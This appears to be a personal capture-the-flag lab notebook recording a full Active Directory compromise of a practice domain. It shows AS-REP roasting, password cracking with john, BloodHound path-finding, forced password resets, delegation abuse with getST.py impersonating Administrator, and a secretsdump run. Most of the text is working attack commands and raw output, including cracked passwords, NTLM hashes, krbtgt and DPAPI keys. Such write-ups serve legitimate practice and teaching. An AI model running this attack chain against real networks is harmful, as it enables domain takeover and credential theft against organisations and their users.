$krb5asrep$23$ERNESTO_SILVA@THM.CORP:bfc85937639d66c0e0ced6494d7631d1$e4e3745955927a852712bb2c36c0b31bb3075296153487aa770ebb5c6f6f829992718a190b28710b1feba565b05142758d10dfcd32d6e16f3755792f580fd454ef11369c8826c0328cdc1fe04237377dcc65b3c32fda2dd4b1e5af27f5ff92bd63ab68dfc28bfe03b9de4d81c7fc6fdafcd1c2fe0a25d3e810b59c12a49ba9062281979114342fa0af44f5a1d7a443b66918cba33a876e834d19214b6d1387c13f5421148e86e0bb812ac1eb3a29e869b3974ab034dc2234ace776eacf8a11c860d863c2474eb4bfedc0d5a90012928994a56faec695384b124a710e281c9bb9e2547185
[-] invalid principal syntax
[-] User TRACY_CARVER doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User SHAWNA_BRAY doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User CECILE_WONG doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User CYRUS_WHITEHEAD doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User DEANNE_WASHINGTON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User ELLIOT_CHARLES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User MICHEL_ROBINSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User MITCHELL_SHAW doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User FANNY_ALLISON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User JULIANNE_HOWE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User ROSLYN_MATHIS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User DANIEL_CHRISTENSEN doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User MARCELINO_BALLARD doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User CRUZ_HALL doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User HOWARD_PAGE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User STEWART_SANTANA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User LINDSAY_SCHULTZ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
$krb5asrep$23$TABATHA_BRITT@THM.CORP:a6192625b5182e251a22f5577be2e95a$3c859050bd9281e12f3df1671af86cd465b05b3228378e1cae557f183d21092f09b1d18a469e169acb4c88d14450dd00d1473f02b76215c9fbbe24550f790992cc144c211afc7ce04ac1d845dc0bd05a3ba75d2347d63e2c30b0406900a60ba70d9dde805e036a52fa5151aae0a0657ac61b21fa595d17d97622bcd0ea5e30b5ba998d900ce3c8384369b39a48a34e3d43e0f591f78e99bb30448ea046e17e5b2c96d019a03ff13beaf4037de0058d135264428ae31b6cb32d1f9cb97d39fcb8d4f3929617c223a3e187d5d6f6f13ee5501a4abbec25bcf973c85aa2d6ec473636a52a5d
[-] invalid principal syntax
[-] User RICO_PEARSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User DARLA_WINTERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User ANDY_BLACKWELL doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] invalid principal syntax
[-] User CHERYL_MULLINS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User LETHA_MAYO doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User HORACE_BOYLE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User CHRISTINA_MCCORMICK doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User 3811465497SA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User MORGAN_SELLERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User MARION_CLAY doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User 3966486072SA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User TED_JACOBSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User AUGUSTA_HAMILTON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] User TREVOR_MELTON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
$krb5asrep$23$LEANN_LONG@THM.CORP:3a15ce4d19ee17eaf6b6fbd8b2e6e5ac$b15dbb11b1bd741b9babb3432ce9fe2618ba08e846acf75de5f708b3011f9af5035eb3a0b5e39d6491a3b5cfa2c08e379eed95186e260cadc260cdaa7cd9f94a6891dabe8ddcfd304cbb8d981f9ee3fff4da5d9e127233e9d8182dae0fa687740f72153940cae7fe6691174d8440d38f4585945088e6f52b03869845dd0dab40e409232c07d68732d361de20764cbba558d87994e98965948a693227a5ced59f2236335be8a8586bedc3a51b4bff8c4da8f7c2c355a9587be4d85632c78cf102ce152306ebafead819d4b1c4286bf30031cf89b6690e03be0cbb70bae4347ca93b1c4f35
[-] invalid principal syntax
[-] User RAQUEL_BENSON doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] User AUTOMATE doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax

-------------------------------------------------------------------------------------------------------------

lets get crackalacking


root@ip-10-201-62-243:/opt/impacket/examples# john --format=krb5asrep-aes-opencl --wordlist=/usr/share/wordlists/rockyou.txt hashlist.txt Device 2: pthread-AMD EPYC 7571 Using default input encoding: UTF-8 Loaded 3 password hashes with 3 different salts (krb5asrep-aes-opencl, Kerberos 5 AS-REP etype 17/18 [PBKDF2-SHA1 OpenCL 8x]) 2 warnings generated. Build log: warning: /opt/john/opencl/opencl_hmac_sha1.h:28:37: duplicate 'const' declaration specifier warning: /opt/john/opencl/opencl_hmac_sha1.h:32:16: duplicate 'const' declaration specifier LWS=8 GWS=64 (8 blocks) Press 'q' or Ctrl-C to abort, almost any other key for status

marlboro(1985)   ($krb5asrep$23$TABATHA_BRITT@THM.CORP)

-------------------------------------------------------------------------------------------------------------

evilwinrm time

couldnt get it to pop

xfreerdp /v:HAYSTACK /u:TABATHA_BRITT /p:marlboro\(1985\)
Y

PS C:\Windows\system32> whoami /priv                                                                                                                                                                                                            PRIVILEGES INFORMATION                                                                                                  ----------------------                                                                                                                                                                                                                          Privilege Name                Description                    State                                                      ============================= ============================== ========                                                   SeMachineAccountPrivilege     Add workstations to domain     Disabled                                                   SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                    SeIncreaseWorkingSetPrivilege Increase a process working set Disabled                                                   PS C:\Windows\system32> whoami                                                                                          thm\tabatha_britt                                                                                                       PS C:\Windows\system32>      


-------------------------------------------------------------------------------------------------------------


I can't see the local priv esc vertically I went back to old labs and tried some stuff like checking execution policy so we can still check horizontal moves

root@ip-10-201-62-243:~# bloodhound-python -dc HAYSTACK.thm.corp -d thm.corp -u TABATHA_BRITT -p 'marlboro(1985)' -ns 10.201.13.246 --dns-tcp -c ALL

neo4j console start

(quickstart gui bloodhound idk it works brah)
![[Pasted image 20251009182345.png]]

-------------------------------------------------------------------------------------------------------------


this screenshot demonstrates TABATHA's generic all on RAQUEL_BENSON and SHAWNA_BRAY

This may be our opportunity at lateral movement

![[Pasted image 20251010090944.png]]

-------------------------------------------------------------------------------------------------------------

I got chatgpt to write this query for me so im testing if I can chain together any of these generic alls with RAQUEL and SHAWNA

https://gist.github.com/joeminicucci/d9fb42f03186f6aaa556cc5f961f537b

MATCH p=(start {name:"THM\\TABATHA_BRITT"})-[rels*1..2]->(target)
WHERE ALL(r IN rels WHERE type(r) IN [
  'GenericAll','GenericWrite','WriteDacl','WriteOwner','AllExtendedRights',
  'AddMember','AdminTo','Owns'
])
RETURN p

![[Pasted image 20251010095208.png]]

-------------------------------------------------------------------------------------------------------------

This shows a clear path of generic all / generic write /forcechangepasswd relationships that take us to 

So first step is using my genericall I have on SHAWNA_BRAY

https://www.netexec.wiki/smb-protocol/change-user-password

I saw this in a walkthrough and really liked it, they verified the RPC reset via netexec using creds to access samba

now to use forcechangepassword on CRUZ_HALL then HALLs genericwrite on DARLA_WINTERS


root@ip-10-201-17-160:~# net rpc password SHAWNA_BRAY ResetMe123! -U "thm.corp/TABATHA_BRITT"%marlboro\(1985\) -S haystack.thm.corp
root@ip-10-201-17-160:~# nxc smb HAYSTACK -u SHAWNA_BRAY -p ResetMe123!
SMB         10.201.39.224   445    HAYSTACK         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         10.201.39.224   445    HAYSTACK         [+] thm.corp\SHAWNA_BRAY:ResetMe123!
root@ip-10-201-17-160:~# net rpc password CRUZ_HALL ResetMe123! -U "thm.corp/SHAWNA_BRAY"%ResetMe123! -S haystack.thm.corp
root@ip-10-201-17-160:~# nxc smb HAYSTACK -u CRUZ_HALL -p ResetMe123!
SMB         10.201.39.224   445    HAYSTACK         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         10.201.39.224   445    HAYSTACK         [+] thm.corp\CRUZ_HALL:ResetMe123!
root@ip-10-201-17-160:~# 


PS C:\Windows\system32> whoami /priv                                                                                                                                                                                                            PRIVILEGES INFORMATION                                                                                                  ----------------------                                                                                                                                                                                                                          Privilege Name                Description                    State                                                      ============================= ============================== ========                                                   SeMachineAccountPrivilege     Add workstations to domain     Disabled                                                   SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                    SeIncreaseWorkingSetPrivilege Increase a process working set Disabled                                                   PS C:\Windows\system32>       

-------------------------------------------------------------------------------------------------------------

creds work but they don't immediately give me something cool

getting bloodhound to work again

rm -f /etc/resolv.conf
mkdir -p /run/systemd/resolve
echo "nameserver 10.201.39.224" > /run/systemd/resolve/stub-resolv.conf
ln -sf /run/systemd/resolve/stub-resolv.conf /etc/resolv.conf
chmod 644 /run/systemd/resolve/stub-resolv.conf

# Fix sudo hostname warning
grep -q "$(hostname)" /etc/hosts || echo "127.0.1.1 $(hostname)" >> /etc/hosts

# Verify DNS
cat /etc/resolv.conf
nslookup HAYSTACK.thm.corp 10.201.39.224

# Run BloodHound
bloodhound-python -dc HAYSTACK.thm.corp -d thm.corp -u DARLA_WINTERS -p 'marlboro(1985)' -ns 10.201.39.224 --dns-tcp -c ALL

-------------------------------------------------------------------------------------------------------------

It looks like I dont get much of a different perspective listening with her creds

![[Pasted image 20251010114052.png]]

here we see winters has delegations to the cifs service

root@ip-10-201-17-160:/opt/impacket/examples# getST.py -spn cifs/HayStack.thm.corp -dc-ip 10.201.39.224 -impersonate Administrator thm.corp/DARLA_WINTERS:'newPassword2022'



root@ip-10-201-17-160:/opt/impacket/examples# secretsdump.py -k -no-pass HAYSTACK.thm.corp
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ab4f5a5c42df5a0ee337d12ce77332f5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
THM\HAYSTACK$:plain_password_hex:cf542204b378656614f4b4812def1b0c4f94baaad25ce6008b5f8e39d27063692c64a1e173e7e5875e1aa3e49340a010d76ede3894df289200987924883d0a10eaa57d28a328bd078dcec4d48d3132e4da28dbaeb39c627eb674f5abc82e7a8155ddc93df3167b313c1f4fb9f8416d5287d0a74e50faf104b63fdaf1de5f9a898b4786f17fbd586b088748c905f93f38d3805cd2da74d78901dc2fa4a5de4a2d1bec33b73d450a7cc2a860c7e2e72bc0e053dab75bf4481286027d3a408cb4a10395337247abba671bef4062aca60d279203981915383ae88b06aaa5ac19ca6ed165fd00003ef6150ef91d5f7c77f1e5
THM\HAYSTACK$:aad3b435b51404eeaad3b435b51404ee:98e36148fc1e4045cca325254374dfac:::
[*] DefaultPassword 
THM\automate:Passw0rd!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0e88ce11d311d3966ca2422ac2708a4d707e00be
dpapi_userkey:0x8b68be9ef724e59070e7e3559e10078e36e8ab32
[*] NL$KM 
 0000   8D D2 8E 67 54 58 89 B1  C9 53 B9 5B 46 A2 B3 66   ...gTX...S.[F..f
 0010   D4 3B 95 80 92 7D 67 78  B7 1D F9 2D A5 55 B7 A3   .;...}gx...-.U..
 0020   61 AA 4D 86 95 85 43 86  E3 12 9E C4 91 CF 9A 5B   a.M...C........[
 0030   D8 BB 0D AE FA D3 41 E0  D8 66 3D 19 75 A2 D1 B2   ......A..f=.u...
NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:067a84e5afaed843ed4a8fdac5facac3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ce852eb247bbe2e5818cd8d66ed19ec5:::
thm.corp\3091731410SA:1111:aad3b435b51404eeaad3b435b51404ee:9e4250bde014b547b331670c9de6522a:::
thm.corp\ERNESTO_SILVA:1112:aad3b435b51404eeaad3b435b51404ee:067a84e5afaed843ed4a8fdac5facac3:::
thm.corp\TRACY_CARVER:1113:aad3b435b51404eeaad3b435b51404ee:a5988a49e60fe1120f498da30caa41cd:::
thm.corp\SHAWNA_BRAY:1114:aad3b435b51404eeaad3b435b51404ee:54345a04a2fd1858bf1f3cb46bcce704:::
thm.corp\CECILE_WONG:1115:aad3b435b51404eeaad3b435b51404ee:067a84e5afaed843ed4a8fdac5facac3:::
thm.corp\CYRUS_WHITEHEAD:1116:aad3b435b51404eeaad3b435b51404ee:3778e42b1e69d1e94247a8da49bfa7b1:::
thm.corp\DEANNE_WASHINGTON:1117:aad3b435b51404eeaad3b435b51404ee:2a814e21a86508450b42184f76d0db5b:::
thm.corp\ELLIOT_CHARLES:1118:aad3b435b51404eeaad3b435b51404ee:b1742442ac0e99f0175d48c763d1c499:::
thm.corp\MICHEL_ROBINSON:1119:aad3b435b51404eeaad3b435b51404ee:bc2f8695333a21cb4aa01f2e907f6d73:::
thm.corp\MITCHELL_SHAW:1120:aad3b435b51404eeaad3b435b51404ee:98ff3cd616f710a5aa50cb0d39fa71ad:::
thm.corp\FANNY_ALLISON:1121:aad3b435b51404eeaad3b435b51404ee:14bb57ce92d0abd1961e20abaa96ea0a:::
thm.corp\JULIANNE_HOWE:1122:aad3b435b51404eeaad3b435b51404ee:2ebf173e7885e890e7e405eff3058905:::
thm.corp\ROSLYN_MATHIS:1123:aad3b435b51404eeaad3b435b51404ee:370e0f37497559a91ff115669277e339:::
thm.corp\DANIEL_CHRISTENSEN:1124:aad3b435b51404eeaad3b435b51404ee:ac42e104e98a78704794c934faebf369:::
thm.corp\MARCELINO_BALLARD:1125:aad3b435b51404eeaad3b435b51404ee:fbcee21eab6256be6d3d6257cc0ae4a2:::
thm.corp\CRUZ_HALL:1126:aad3b435b51404eeaad3b435b51404ee:54345a04a2fd1858bf1f3cb46bcce704:::
thm.corp\HOWARD_PAGE:1127:aad3b435b51404eeaad3b435b51404ee:be6fab82219db563a8252a0216632a83:::
thm.corp\STEWART_SANTANA:1128:aad3b435b51404eeaad3b435b51404ee:25c36f56de91b11e42db3830334decd8:::
thm.corp\LINDSAY_SCHULTZ:1130:aad3b435b51404eeaad3b435b51404ee:b322c000e78e139da945c9f1dc1f0210:::
thm.corp\TABATHA_BRITT:1131:aad3b435b51404eeaad3b435b51404ee:cea30062373feb964175952ee108c260:::
thm.corp\RICO_PEARSON:1132:aad3b435b51404eeaad3b435b51404ee:5cd05b29055ca4a3f3c8866b355960a3:::
thm.corp\DARLA_WINTERS:1133:aad3b435b51404eeaad3b435b51404ee:54345a04a2fd1858bf1f3cb46bcce704:::
thm.corp\ANDY_BLACKWELL:1134:aad3b435b51404eeaad3b435b51404ee:31202949e1809026ef9bef0879800369:::
thm.corp\LILY_ONEILL:1135:aad3b435b51404eeaad3b435b51404ee:949ce911e35575611bc6dfc24ab7771f:::
thm.corp\CHERYL_MULLINS:1136:aad3b435b51404eeaad3b435b51404ee:fb59d7a606b5cc62da30c853682895f5:::
thm.corp\LETHA_MAYO:1137:aad3b435b51404eeaad3b435b51404ee:17c3b1185d18e99969d5ebab109a378e:::
thm.corp\HORACE_BOYLE:1138:aad3b435b51404eeaad3b435b51404ee:067a84e5afaed843ed4a8fdac5facac3:::
thm.corp\CHRISTINA_MCCORMICK:1139:aad3b435b51404eeaad3b435b51404ee:4cebc9ba64d778c0cdff5f784a959cdd:::
thm.corp\3811465497SA:1141:aad3b435b51404eeaad3b435b51404ee:eb0885d1955f642d2ae09b8d6944d69e:::
thm.corp\MORGAN_SELLERS:1142:aad3b435b51404eeaad3b435b51404ee:257a17ce10f75d09241820523c03093e:::
thm.corp\MARION_CLAY:1143:aad3b435b51404eeaad3b435b51404ee:78fbe1703076643084c223e9f30b4b2c:::
thm.corp\3966486072SA:1144:aad3b435b51404eeaad3b435b51404ee:c2920d45332ddb9b9c955ae8d01fbd49:::
thm.corp\TED_JACOBSON:1146:aad3b435b51404eeaad3b435b51404ee:6eccab6de489cd86977f6cd3768c3101:::
thm.corp\AUGUSTA_HAMILTON:1147:aad3b435b51404eeaad3b435b51404ee:3059fa4d2174c9fa4d12e84fd388dcb0:::
thm.corp\TREVOR_MELTON:1148:aad3b435b51404eeaad3b435b51404ee:067a84e5afaed843ed4a8fdac5facac3:::
thm.corp\LEANN_LONG:1149:aad3b435b51404eeaad3b435b51404ee:067a84e5afaed843ed4a8fdac5facac3:::
thm.corp\RAQUEL_BENSON:1150:aad3b435b51404eeaad3b435b51404ee:ee384706745bbe70b87f7e6e77c6e2d0:::
thm.corp\AUTOMATE:1156:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
HAYSTACK$:1008:aad3b435b51404eeaad3b435b51404ee:98e36148fc1e4045cca325254374dfac:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f2313ddc9686cd8ea1e67586173d3218bdc897a3c717dea005d31d8280291d75
Administrator:aes128-cts-hmac-sha1-96:a221004822c82f96664e247308ce6904
Administrator:des-cbc-md5:1cdac7ae988a5b32
krbtgt:aes256-cts-hmac-sha1-96:bed293d4c6efc6bb4fe48d9ff908044d99dd5c04768d76d25cb7743c3689f269
krbtgt:aes128-cts-hmac-sha1-96:f5b455e81c8ad4cadb18b04c402aeba3
krbtgt:des-cbc-md5:aebca4b6bfce8046
thm.corp\3091731410SA:aes256-cts-hmac-sha1-96:200a4d1e1f91c994b64863ee605d9ed7e5b583cda2863d0937df9169ac9c9f42
thm.corp\3091731410SA:aes128-cts-hmac-sha1-96:3d8d88959622b7d8769de80c33c16976
thm.corp\3091731410SA:des-cbc-md5:2ae0f7c2da624ae6
thm.corp\ERNESTO_SILVA:aes256-cts-hmac-sha1-96:91dac333559c147611e1f47b42ef3793aa9acbef588a1fb24c947182b6c29128
thm.corp\ERNESTO_SILVA:aes128-cts-hmac-sha1-96:d3436ae5a8dd806e5500030a2881812d
thm.corp\ERNESTO_SILVA:des-cbc-md5:79c1bc7679d9fb43
thm.corp\TRACY_CARVER:aes256-cts-hmac-sha1-96:f06d6c71e25903f0901623be73bd5b32f0b0a0e3f68e3d23495ec629b840456d
thm.corp\TRACY_CARVER:aes128-cts-hmac-sha1-96:2cd96856a229db08e0613bec48e0cec0
thm.corp\TRACY_CARVER:des-cbc-md5:8a89d9c82a9e8585
thm.corp\SHAWNA_BRAY:aes256-cts-hmac-sha1-96:2718f99d6680f8cec91c375fcca20905d6ed9738118fc7bc78a637a5200b9cfa
thm.corp\SHAWNA_BRAY:aes128-cts-hmac-sha1-96:8c1c72a794e97d3a7a8e78cd3403ceae
thm.corp\SHAWNA_BRAY:des-cbc-md5:6e671caef46d5da2
thm.corp\CECILE_WONG:aes256-cts-hmac-sha1-96:44a06bd342c2d8ce71d67a10209e6438b851fbf0048a12e51625186185ed4550
thm.corp\CECILE_WONG:aes128-cts-hmac-sha1-96:b4d4fd29265a11a0cd6ff3181a0582d6
thm.corp\CECILE_WONG:des-cbc-md5:b9f251f4f8ab0773
thm.corp\CYRUS_WHITEHEAD:aes256-cts-hmac-sha1-96:bbf93bdc29fe1e7f35213b5fb71afef7745dda6774f883e289104e767d2dc773
thm.corp\CYRUS_WHITEHEAD:aes128-cts-hmac-sha1-96:663d0e41aa44d37da0534f33c50882a3
thm.corp\CYRUS_WHITEHEAD:des-cbc-md5:01688c459dd6b668
thm.corp\DEANNE_WASHINGTON:aes256-cts-hmac-sha1-96:dc5655fff4f84e6f75855a1419b9201db500ee76264c16d98b75dce45b090c90
thm.corp\DEANNE_WASHINGTON:aes128-cts-hmac-sha1-96:0a5ecbd5130be39f338716bc69b31f1b
thm.corp\DEANNE_WASHINGTON:des-cbc-md5:1a0e46d092108598
thm.corp\ELLIOT_CHARLES:aes256-cts-hmac-sha1-96:8c7f78aaf6c34d49db5565fdc4782a0e09b53c8a193fa25644d266c0fab7d27c
thm.corp\ELLIOT_CHARLES:aes128-cts-hmac-sha1-96:befb540887ce770cdb90d31c98cf2f12
thm.corp\ELLIOT_CHARLES:des-cbc-md5:9ec26d91a776d685
thm.corp\MICHEL_ROBINSON:aes256-cts-hmac-sha1-96:dc630e2d42f37f7b857e068eb67b50ed0a7d708c8dfe38f4ad1ffc54ab509a29
thm.corp\MICHEL_ROBINSON:aes128-cts-hmac-sha1-96:880bfc2638c74f947c489196ba7758c0
thm.corp\MICHEL_ROBINSON:des-cbc-md5:dc4aad646d49b515
thm.corp\MITCHELL_SHAW:aes256-cts-hmac-sha1-96:c1f687e8ffb1d0ecdc1da904e7b3c2851466c81e4c10ad1980213f81102c6cc5
thm.corp\MITCHELL_SHAW:aes128-cts-hmac-sha1-96:d43e03475941b1112e94cb0b541dd1db
thm.corp\MITCHELL_SHAW:des-cbc-md5:e01f0bf1d31ff19d
thm.corp\FANNY_ALLISON:aes256-cts-hmac-sha1-96:9138ff599c888a199ea7abe88af7fb42a0efd05b7994580ae5c3e0f1d76b3231
thm.corp\FANNY_ALLISON:aes128-cts-hmac-sha1-96:9fae02c28263384f132a45368959502f
thm.corp\FANNY_ALLISON:des-cbc-md5:cb1abf4a7fb0ec29
thm.corp\JULIANNE_HOWE:aes256-cts-hmac-sha1-96:1465ae82af03180a1ed79f8397982da59f4d0ee50d5c9950d36002d661383fc1
thm.corp\JULIANNE_HOWE:aes128-cts-hmac-sha1-96:418b9f7d3dbecd63d01e82905d49fc7f
thm.corp\JULIANNE_HOWE:des-cbc-md5:da1c40fee6ae9132
thm.corp\ROSLYN_MATHIS:aes256-cts-hmac-sha1-96:0559bff492f403eb416243306e5ad1c51672528f5e28f69d290efe4316ab9dd9
thm.corp\ROSLYN_MATHIS:aes128-cts-hmac-sha1-96:c7cb3f8eee56e5a70fcb4a24f5cc0e93
thm.corp\ROSLYN_MATHIS:des-cbc-md5:3dc78689abbf2504
thm.corp\DANIEL_CHRISTENSEN:aes256-cts-hmac-sha1-96:afaa9ba7d789d135c983b53957c98203f88fd0717732f26f0cbc5258624271ee
thm.corp\DANIEL_CHRISTENSEN:aes128-cts-hmac-sha1-96:8b2fb161c0a9844bf765698a17888a39
thm.corp\DANIEL_CHRISTENSEN:des-cbc-md5:7913d08fefd53452
thm.corp\MARCELINO_BALLARD:aes256-cts-hmac-sha1-96:3fecd3966fc991567f4cb397e7ed86649a29b72a7fa02c2a408105386baa75c6
thm.corp\MARCELINO_BALLARD:aes128-cts-hmac-sha1-96:3dfcfb0dfb623e83a3899ed47c617d9c
thm.corp\MARCELINO_BALLARD:des-cbc-md5:29d3792c8a6dd301
thm.corp\CRUZ_HALL:aes256-cts-hmac-sha1-96:79eaf9052cfa0351a91d5bbc1663e0b4a9f4f5d772eda3e30c2fe3aec8b22af4
thm.corp\CRUZ_HALL:aes128-cts-hmac-sha1-96:d88e0dbe0607084f75b610556b73101a
thm.corp\CRUZ_HALL:des-cbc-md5:8c7f7ca2dcc75780
thm.corp\HOWARD_PAGE:aes256-cts-hmac-sha1-96:dce73c510a8a24b838750a666062dc9e00305599ba7b716c2f2ee03cb6580f3b
thm.corp\HOWARD_PAGE:aes128-cts-hmac-sha1-96:0d19ddd1d435623ed67a5d1b96667b4b
thm.corp\HOWARD_PAGE:des-cbc-md5:400b7cb3f28fef25
thm.corp\STEWART_SANTANA:aes256-cts-hmac-sha1-96:ae2fe0c41d0fbf5c318d406725ea82995fed7ca43c244ab7a2147e511f03b385
thm.corp\STEWART_SANTANA:aes128-cts-hmac-sha1-96:603ed41d17d0cb210bdeab837488e8ff
thm.corp\STEWART_SANTANA:des-cbc-md5:a8ab0d4c51df76ba
thm.corp\LINDSAY_SCHULTZ:aes256-cts-hmac-sha1-96:50f6c1a5d92bc014a67ba3ad3cb650447251cbb38a78ebd867bc2d53428edf23
thm.corp\LINDSAY_SCHULTZ:aes128-cts-hmac-sha1-96:6ef47eaafc0925b5afe11cb4ac64f677
thm.corp\LINDSAY_SCHULTZ:des-cbc-md5:3df791a77f61cbcb
thm.corp\TABATHA_BRITT:aes256-cts-hmac-sha1-96:a102b12a3ce89f539d2e0f42dbbb2f70f9825536811ebdc9dcc2ae8063390031
thm.corp\TABATHA_BRITT:aes128-cts-hmac-sha1-96:43f9cb87c107900a6be77620a18f4e78
thm.corp\TABATHA_BRITT:des-cbc-md5:2c1931e067f2e923
thm.corp\RICO_PEARSON:aes256-cts-hmac-sha1-96:9ae8c05b2ca4af6717a9c253dc28a406264c66e040c9eef6fb424c669b888c71
thm.corp\RICO_PEARSON:aes128-cts-hmac-sha1-96:b1fe9d9df76912e746215e44d48711da
thm.corp\RICO_PEARSON:des-cbc-md5:9d6e9bcd689116ab
thm.corp\DARLA_WINTERS:aes256-cts-hmac-sha1-96:7f26c6a8b18f2fc986aae1d71ae5ecd6ea6eb6897d0aeda58c3cdee37375c85b
thm.corp\DARLA_WINTERS:aes128-cts-hmac-sha1-96:07254462c96de87817c7853e175634be
thm.corp\DARLA_WINTERS:des-cbc-md5:61cd7919d31cfb0e
thm.corp\ANDY_BLACKWELL:aes256-cts-hmac-sha1-96:dd99d48d44de7cc16edbfae8abeae1b2bf5454a5800514b4644574fc1cce7fbd
thm.corp\ANDY_BLACKWELL:aes128-cts-hmac-sha1-96:27b1e4bd4d99f9e6f11d19466ab90dc4
thm.corp\ANDY_BLACKWELL:des-cbc-md5:a48ada618cf70d91
thm.corp\LILY_ONEILL:aes256-cts-hmac-sha1-96:a034230a13633a6928039ec5294e38ce630006382e1dce2c3800a689e465fa4c
thm.corp\LILY_ONEILL:aes128-cts-hmac-sha1-96:87f6ef580fc3b5599a4c940346753821
thm.corp\LILY_ONEILL:des-cbc-md5:1c2f254ac864eaef
thm.corp\CHERYL_MULLINS:aes256-cts-hmac-sha1-96:f0e92ff51f4b70ac27f844059f4bc0a23f7b7961b76aacf265c074e9f2571ca4
thm.corp\CHERYL_MULLINS:aes128-cts-hmac-sha1-96:070ba0af7037947fd0df79e2f0d55f3c
thm.corp\CHERYL_MULLINS:des-cbc-md5:dab08a64a8105876
thm.corp\LETHA_MAYO:aes256-cts-hmac-sha1-96:7306368a184c2d3610f6485fe1249dd7d281975e2d485db31f25ca0deddfe66d
thm.corp\LETHA_MAYO:aes128-cts-hmac-sha1-96:6e0496d6e872df0667568a55fd61c479
thm.corp\LETHA_MAYO:des-cbc-md5:9beac22ca7891683
thm.corp\HORACE_BOYLE:aes256-cts-hmac-sha1-96:c0f6cb878875f6020d011034bfd0d7263cf7d11f88e0ea2d192129fb5c0ecb59
thm.corp\HORACE_BOYLE:aes128-cts-hmac-sha1-96:148516bf3d9784123a3977ec1806230a
thm.corp\HORACE_BOYLE:des-cbc-md5:fdc715611515a764
thm.corp\CHRISTINA_MCCORMICK:aes256-cts-hmac-sha1-96:849207197e58f82d8223c63680ce7902f631ddc6cd88b772fadf4a76ba3920b7
